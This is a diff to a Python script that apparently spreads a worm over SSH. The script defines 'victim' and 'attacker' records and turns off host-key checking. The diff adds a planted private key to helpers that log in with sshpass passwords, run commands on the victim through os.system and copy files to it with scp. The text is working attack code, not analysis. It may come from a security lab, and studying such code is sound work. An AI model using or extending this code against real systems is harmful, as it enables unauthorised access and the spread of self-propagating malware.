@@ -3,6 +3,7 @@ import sys
 
 victim, attacker = {}, {}
 NO_AUTHENTICATION = '-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'
+WITH_PRIVATE_KEY = '-i ~/.ssh/victim_key'
 
 
 def set_up_ssh_key():
@@ -28,16 +29,20 @@ def send_worm_to_victim():
 
 
 def send_ssh_command(command, isNeedPw=True):
+    privateKey = '' if isNeedPw else WITH_PRIVATE_KEY
+
     sshCommand = 'sshpass -p \"{0}\" '.format(victim['password']) if isNeedPw else ''
-    sshCommand += 'ssh -t {0}@{1} -p {2} {3} \"{4}\"'.format(victim['name'], victim['ip'], victim['port'], NO_AUTHENTICATION, command)
+    sshCommand += 'ssh -t {0}@{1} -p {2} {3} {4} \"{5}\"'.format(victim['name'], victim['ip'], victim['port'], NO_AUTHENTICATION, privateKey, command)
 
     print('[Send SSH Command] ' + sshCommand)
     os.system(sshCommand)
 
 
 def send_scp_command(sendFile, directory, isNeedPw=True):
+    privateKey = '' if isNeedPw else WITH_PRIVATE_KEY
+
     scpCommand = 'sshpass -p \"{0}\" '.format(victim['password']) if isNeedPw else ''
-    scpCommand += 'scp -P {0} {1} {2} {3}@{4}:{5}'.format(victim['port'], NO_AUTHENTICATION, sendFile, victim['name'], victim['ip'], directory)
+    scpCommand += 'scp -P {0} {1} {2} {3} {4}@{5}:{6}'.format(victim['port'], NO_AUTHENTICATION, privateKey, sendFile, victim['name'], victim['ip'], directory)
 
     print('[Send SCP Command] ' + scpCommand)
     os.system(scpCommand)
